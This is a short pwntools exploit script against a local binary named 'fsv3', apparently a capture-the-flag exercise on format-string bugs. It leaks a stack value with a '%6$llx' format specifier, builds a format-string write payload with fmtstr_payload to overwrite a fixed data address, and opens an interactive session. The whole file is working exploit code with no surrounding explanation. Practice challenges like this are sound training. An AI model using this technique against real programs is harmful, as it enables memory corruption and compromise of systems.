#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

#io = gdb.debug('./fsv3', gdbscript = '''
#    b main
#    b*0x4012e7
#    c
#        ''')
io = process('./fsv3');

DATA_ADDR = 0x4040a0

io.recvuntil(b'data: ');
io.sendline(b'%6$llx');

number = int(io.recvline(), 16);
log.info('Number: ' + hex(number));

# creating payload by hand at would require lots of ugly code
# especialy that I am bad at python, lol
payload = pwnlib.fmtstr.fmtstr_payload(8, { 
        (DATA_ADDR + 0): (number),
    }, write_size='byte');

log.info('Payload: ' + str(payload));
io.sendline(payload);

io.interactive()
